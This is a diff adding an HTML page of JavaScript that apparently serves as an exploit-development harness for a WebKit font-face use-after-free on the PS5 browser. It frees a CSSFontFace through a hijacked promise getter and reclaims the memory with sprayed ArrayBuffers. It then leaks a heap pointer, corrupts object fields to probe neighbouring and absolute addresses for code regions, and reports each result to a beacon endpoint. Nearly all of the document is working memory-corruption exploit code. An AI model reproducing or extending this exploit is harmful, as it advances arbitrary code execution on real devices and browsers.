@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v17</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v17_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v17 BOOT test='+testNum);
+bn('P844v17-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },800);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v17-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+// Gate ON: suppress bg process pointer following
+function gateOn(bv,self){bv[0]=0x100000001n;for(var i=1;i<24;i++)bv[i]=self;}
+// Gate OFF with q1=target: let bg process fire on target
+function gateOff(bv,self,target){
+  bv[0]=1n; // refcount=1, gate OFF (byte+4=0)
+  bv[1]=target; // q1 = test target
+  for(var i=2;i<24;i++)bv[i]=self; // q8,q10,q11 = safe self
+}
+
+// Each test: UAF → gate ON → set q1=target → gate OFF → wait 600ms → if alive, beacon result
+var TESTS=[
+
+// === PHASE A: Heap neighborhood scan (192B slots near self) ===
+
+// T0: self - 192 (previous 192B slot)
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v17-T0-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self-192n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T0-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T1: self + 192 (next 192B slot)
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v17-T1-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self+192n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T1-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T2: self - 384 (2 slots back)
+function(){
+  setTest(3);
+  doUAF('T2',function(r){
+    if(!r)return fin('P844v17-T2-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self-384n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T2-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T3: self + 384 (2 slots forward)
+function(){
+  setTest(4);
+  doUAF('T3',function(r){
+    if(!r)return fin('P844v17-T3-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self+384n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T3-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T4: self - 0x1000 (1 page back)
+function(){
+  setTest(5);
+  doUAF('T4',function(r){
+    if(!r)return fin('P844v17-T4-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self-0x1000n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T4-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T5: self + 0x1000 (1 page forward)
+function(){
+  setTest(6);
+  doUAF('T5',function(r){
+    if(!r)return fin('P844v17-T5-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var target=self+0x1000n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,target);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T5-OK','ALIVE|self=0x'+self.toString(16)+'|tgt=0x'+target.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// === PHASE B: Absolute address scan (find code region) ===
+
+// T6: 0x200000000 (possible low code)
+function(){
+  setTest(7);
+  doUAF('T6',function(r){
+    if(!r)return fin('P844v17-T6-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x200000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T6-OK','ALIVE|tgt=0x200000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T7: 0x400000000
+function(){
+  setTest(8);
+  doUAF('T7',function(r){
+    if(!r)return fin('P844v17-T7-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x400000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T7-OK','ALIVE|tgt=0x400000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T8: 0x800000000
+function(){
+  setTest(9);
+  doUAF('T8',function(r){
+    if(!r)return fin('P844v17-T8-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x800000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T8-OK','ALIVE|tgt=0x800000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T9: 0x820000000 (possible WebKit code on PS5 — near eboot range)
+function(){
+  setTest(10);
+  doUAF('T9',function(r){
+    if(!r)return fin('P844v17-T9-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x820000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T9-OK','ALIVE|tgt=0x820000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T10: q13 heap pointer — test the OTHER known address from CSSFontFace
+// q13 is ~1MB before self. What's at that address? Maybe CSSFontSelector (virtual)?
+function(){
+  setTest(11);
+  doUAF('T10',function(r){
+    if(!r)return fin('P844v17-T10-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    var q13val=r.bv[13]; // the heap pointer from CSSFontFace data
+    if(q13val===0n)return fin('P844v17-T10-OK','q13=0');
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,q13val);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T10-OK','ALIVE|q13=0x'+q13val.toString(16)+'|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T11: Read q13 target's first 8 bytes by reading it through dual UAF
+// Fire two UAFs, point UAF1.q1 → UAF2, set UAF2 data = q13 value at each offset
+// Actually simpler: just report q13 and try to use it
+function(){
+  setTest(12);
+  doUAF('T11',function(r){
+    if(!r)return fin('P844v17-T11-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    // Full CSSFontFace dump — check ALL nonzero qwords for potential code pointers
+    var dump=[];
+    for(var i=0;i<24;i++){
+      if(r.bv[i]!==0n){
+        var v=r.bv[i];
+        var hi=Number(v>>32n)&0xFFFFFFFF;
+        var kptr=(hi>=0xFFFF8000);
+        var code=(hi>=0x0000 && hi<=0x0010 && v>0x100n);
+        dump.push('q'+i+'=0x'+v.toString(16)+(kptr?'[K]':'')+(code?'[C?]':''));
+      }
+    }
+    fin('P844v17-T11-OK','dump='+dump.join(',')+'|self=0x'+self.toString(16));
+  });
+},
+
+// T12: 0xC00000000
+function(){
+  setTest(13);
+  doUAF('T12',function(r){
+    if(!r)return fin('P844v17-T12-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0xC00000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T12-OK','ALIVE|tgt=0xC00000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T13: 0xE00000000
+function(){
+  setTest(14);
+  doUAF('T13',function(r){
+    if(!r)return fin('P844v17-T13-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0xE00000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T13-OK','ALIVE|tgt=0xE00000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T14: 0x1000000000 (64GB — near our heap)
+function(){
+  setTest(15);
+  doUAF('T14',function(r){
+    if(!r)return fin('P844v17-T14-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x1000000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T14-OK','ALIVE|tgt=0x1000000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+},
+
+// T15: 0x600000000
+function(){
+  setTest(16);
+  doUAF('T15',function(r){
+    if(!r)return fin('P844v17-T15-OK','uaf=miss');
+    var self=r.bv[11]-0x58n;
+    gateOn(r.bv,self);
+    setTimeout(function(){
+      gateOff(r.bv,self,0x600000000n);
+      setTimeout(function(){
+        gateOn(r.bv,self);
+        fin('P844v17-T15-OK','ALIVE|tgt=0x600000000|self=0x'+self.toString(16));
+      },600);
+    },100);
+  });
+}
+];
+
+var NAMES=['T0-selfMinus192','T1-selfPlus192','T2-selfMinus384','T3-selfPlus384',
+  'T4-selfMinus4K','T5-selfPlus4K','T6-0x200M','T7-0x400M','T8-0x800M','T9-0x820M',
+  'T10-q13target','T11-fulldump','T12-0xC00M','T13-0xE00M','T14-0x1000M','T15-0x600M'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v17-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v17-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
